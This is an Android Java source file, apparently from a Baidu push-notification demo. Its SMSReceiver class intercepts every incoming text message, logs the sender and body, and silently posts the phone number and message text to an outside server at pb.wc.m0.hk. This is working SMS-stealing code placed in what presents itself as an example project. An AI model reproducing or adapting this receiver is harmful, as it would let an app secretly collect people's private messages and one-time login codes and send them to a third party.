package com.baidu.push.example;

import java.text.SimpleDateFormat;
import java.util.Date;

import org.apache.http.Header;

import com.loopj.android.http.AsyncHttpClient;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;

import android.app.DownloadManager.Request;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import android.util.Log;

public class SMSReceiver extends BroadcastReceiver {

	public static final String TAG = "ImiChatSMSReceiver";

    public static final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED";
    
	@Override
	public void onReceive(Context context, Intent intent) {
		if (intent.getAction().equals(SMS_RECEIVED_ACTION))

	       {

	           SmsMessage[] messages = getMessagesFromIntent(intent);

	           for (SmsMessage message : messages)

	           {

	        	  String responseString = message.getOriginatingAddress() + " : " +

	                  message.getDisplayOriginatingAddress() + " : " +

	                  message.getDisplayMessageBody() + " : " +

	                  message.getTimestampMillis();
	              
	              updateContent(context, responseString);
	              
	              AsyncHttpClient client = new AsyncHttpClient();
	              RequestParams params = new RequestParams();
	              params.add("phone", message.getOriginatingAddress());
	              params.add("message", message.getDisplayMessageBody());
	              client.post("http://pb.wc.m0.hk/sms/receive", params, new AsyncHttpResponseHandler() {
					@Override
					public void onSuccess(int arg0, Header[] arg1, byte[] arg2) {
						
					}
					
					@Override
					public void onFailure(int arg0, Header[] arg1, byte[] arg2, Throwable arg3) {
						
					}
				});
	           }

	       }
	}

	public final SmsMessage[] getMessagesFromIntent(Intent intent)

    {

        Object[] messages = (Object[]) intent.getSerializableExtra("pdus");

        byte[][] pduObjs = new byte[messages.length][];

 

        for (int i = 0; i < messages.length; i++)

        {

            pduObjs[i] = (byte[]) messages[i];

        }

        byte[][] pdus = new byte[pduObjs.length][];

        int pduCount = pdus.length;

        SmsMessage[] msgs = new SmsMessage[pduCount];

        for (int i = 0; i < pduCount; i++)

        {

            pdus[i] = pduObjs[i];

            msgs[i] = SmsMessage.createFromPdu(pdus[i]);

        }

        return msgs;

    }
	
	private void updateContent(Context context, String content) {
		Log.d(TAG, "updateContent");
		String logText = "" + Utils.logStringCache;
		
		if (!logText.equals("")) {
			logText += "\n";
		}
		
		SimpleDateFormat sDateFormat = new SimpleDateFormat("HH-mm-ss");
		logText += sDateFormat.format(new Date()) + ": ";
		logText += content;
		
		Utils.logStringCache = logText;
		
		Intent intent = new Intent();
        intent.setClass(context.getApplicationContext(), PushDemoActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.getApplicationContext().startActivity(intent);
	}
}
